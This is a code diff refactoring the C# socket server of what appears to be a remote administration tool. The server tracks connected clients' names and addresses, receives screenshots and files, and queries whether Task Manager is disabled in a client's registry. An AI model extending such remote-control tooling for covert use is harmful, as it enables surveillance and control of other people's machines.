@@ -7,19 +7,10 @@ namespace Server.Server
 {
     public partial class SocketServer
     {
-        private static int iSocketBuffer = 1048576;
         private Thread serverThread, checkClientsThread;
         private readonly static List<Client> clients = new();
         const int
             iMaxConnectedUsers = 100;
-
-        public class Client
-        {
-            public Socket socket;
-            public byte[] buffer = new byte[iSocketBuffer];
-            // Received data string.
-            public StringBuilder dataStringBuilder = new();
-        }
 
         public static Client GetClient(int index)
         {
@@ -49,7 +40,7 @@ namespace Server.Server
                         if (GetClient(i).socket.Connected)
                         {
                             // Ping the client just to be sure.
-                            if (ReadClient(GetClient(i).socket))
+                            if (ReadClient(GetClient(i)))
                                 continue;
                         }
 
@@ -70,21 +61,21 @@ namespace Server.Server
             }
         }
 
-        bool IsBufferEmpty(byte[] buf, int size)
+        private static bool IsBufferEmpty(byte[] buffer, int size)
         {
             for (int i = 0; i < size; i++)
-                if (buf[i] != 0) 
+                if (buffer[i] != 0)
                     return false;
 
             return true;
         }
 
-        public bool ReadClient(Socket clientSocket)
+        public static bool ReadClient(Client client)
         {
-            byte[] buffer = new byte[iSocketBuffer];
+            byte[] buffer = new byte[User.Config.iSocketBuffer];
             try
             {
-                clientSocket.Receive(buffer);
+                client.socket.Receive(buffer);
             }
             catch (SocketException)
             {
@@ -93,13 +84,13 @@ namespace Server.Server
 
             if (buffer.Length > 0)
             {
-                if (IsBufferEmpty(buffer, iSocketBuffer))
+                if (IsBufferEmpty(buffer, User.Config.iSocketBuffer))
                     return false;
 
                 string tempString = Encoding.ASCII.GetString(buffer);
                 tempString = tempString.Split("<EOF>")[0];
 
-                ParseData(tempString);
+                ParseData(client, tempString);
 
                 return true; // Ping succeeded.
             }
@@ -107,7 +98,7 @@ namespace Server.Server
             return true;
         }
 
-        public static void ParseData(string data)
+        public static void ParseData(Client client, string data)
         {
             if (data.StartsWith("<FILE>"))
             {
@@ -118,6 +109,37 @@ namespace Server.Server
             if (data.StartsWith("<PRINTSCREEN>"))
             {
                 ScreenViewer.StartDataReceiveThread();
+            }
+
+            if(data.StartsWith("<GET-TASKMGR-REG>"))
+            {
+                data = data.Replace("<GET-TASKMGR-REG>", "");
+                client.bTaskmgrDisabled = Convert.ToBoolean(int.Parse(data));
+            }
+
+            if (data.StartsWith("<GET-SCREENCOUNT>"))
+            {
+                data = data.Replace("<GET-SCREENCOUNT>", "");
+                client.iScreenCount = int.Parse(data);
+            }
+
+            if (data.StartsWith("<GET-NAME>"))
+            {
+                data = data.Replace("<GET-NAME>", "");
+
+                // Store the name.
+                client.SetUsername(data);
+
+                // Add received name, ip:port to our UI.
+                data += "<SPLIT>" + ((IPEndPoint)client.socket.RemoteEndPoint).Address.ToString()
+                + "<SPLIT>" + ((IPEndPoint)client.socket.RemoteEndPoint).Port.ToString();
+
+                Main.uiRequests.Request(data, RequestUI.RequestType.UI_ADD_USER);
+
+                // Request for additional data.
+                Send(client.socket, "<GET-TASKMGR-REG>");
+                Thread.Sleep(100);
+                Send(client.socket, "<GET-SCREENCOUNT>");
             }
         }
 
@@ -141,23 +163,13 @@ namespace Server.Server
                 if (data.IndexOf("<EOF>") > -1)
                 {
                     // Parse first initial received data
-                    string tempString = data.Replace("<EOF>", "");
-
-                    if (tempString.StartsWith("<CMD=NAME>"))
-                    {
-                        tempString = tempString.Replace("<CMD=NAME>", "");
-
-                        // Add received name, ip:port to our UI.
-                        tempString += "<SPLIT>" + ((IPEndPoint)clientSocket.RemoteEndPoint).Address.ToString()
-                        + "<SPLIT>" + ((IPEndPoint)clientSocket.RemoteEndPoint).Port.ToString();
-
-                        Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_ADD_USER);
-                    }
+                    string szCMD = data.Replace("<EOF>", "");
+                    ParseData(client, szCMD);
                 }
                 else
                 {
                     // Not all data received. Get more.
-                    clientSocket.BeginReceive(client.buffer, 0, iSocketBuffer, 0, new AsyncCallback(ReadCallback), client);
+                    clientSocket.BeginReceive(client.buffer, 0, User.Config.iSocketBuffer, 0, new AsyncCallback(ReadCallback), client);
                 }
             }
         }
@@ -168,11 +180,11 @@ namespace Server.Server
             Socket listener = (Socket)ar.AsyncState;
             clients.Add(new Client());
             clients.Last().socket = listener.EndAccept(ar);
-            clients.Last().socket.BeginReceive(clients.Last().buffer, 0, iSocketBuffer, 0, new AsyncCallback(ReadCallback), clients.Last());
+            clients.Last().socket.BeginReceive(clients.Last().buffer, 0, User.Config.iSocketBuffer, 0, new AsyncCallback(ReadCallback), clients.Last());
             Main.uiRequests.Request("Connection accepted.", RequestUI.RequestType.UI_UPDATE_STATUS);
         }
 
-        public IAsyncResult Send(Socket handler, string data)
+        public static IAsyncResult Send(Socket handler, string data)
         {
             // Convert the string data to byte data using ASCII encoding.
             byte[] byteData = Encoding.ASCII.GetBytes(data + "<EOF>");
@@ -242,7 +254,7 @@ namespace Server.Server
                 Main.uiRequests.Request("Server started", RequestUI.RequestType.UI_UPDATE_STATUS);
             }
 
-            // Ping clients on background thread.
+            // Ping and listen to clients on background thread.
             checkClientsThread = new Thread(CheckClientsThread);
             if (checkClientsThread.ThreadState != ThreadState.Running)
             {
@@ -251,7 +263,7 @@ namespace Server.Server
             }
         }
 
-        public void SuspendServer()
+        public static void SuspendServer()
         {
             try
             {
